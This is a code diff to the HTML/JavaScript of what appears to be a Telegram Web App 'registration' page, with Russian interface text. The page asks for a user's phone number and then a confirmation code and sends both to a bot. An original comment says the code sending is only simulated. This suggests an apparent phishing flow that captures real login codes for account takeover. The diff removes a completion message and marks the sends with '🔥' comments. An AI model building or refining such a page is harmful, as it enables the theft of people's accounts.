@@ -242,11 +242,6 @@
         <div id="stepLoading" class="loading" style="display: none;">
             Отправка запроса...
         </div>
-        
-        <!-- Успех -->
-        <div id="stepSuccess" class="loading" style="display: none;">
-            ✅ Регистрация завершена! Закройте это окно.
-        </div>
     </div>
 
     <script>
@@ -269,7 +264,7 @@
             document.getElementById('stepPhone').style.display = 'none';
             document.getElementById('stepLoading').style.display = 'block';
             
-            // Отправляем номер телефона в бота
+            // 🔥 ОТПРАВЛЯЕМ НОМЕР В БОТА
             const data = {
                 action: 'send_phone',
                 phone: userPhone
@@ -278,9 +273,8 @@
             // Отправляем данные в бота
             tg.sendData(JSON.stringify(data));
             
-            // Симулируем отправку кода
+            // Переходим к вводу кода через 2 секунды
             setTimeout(() => {
-                // Переходим к вводу кода
                 document.getElementById('stepLoading').style.display = 'none';
                 document.getElementById('stepCode').style.display = 'block';
             }, 2000);
@@ -297,7 +291,7 @@
             document.getElementById('stepCode').style.display = 'none';
             document.getElementById('stepLoading').style.display = 'block';
             
-            // Отправляем код в бота
+            // 🔥 ОТПРАВЛЯЕМ КОД В БОТА
             const data = {
                 action: 'send_code',
                 phone: userPhone,
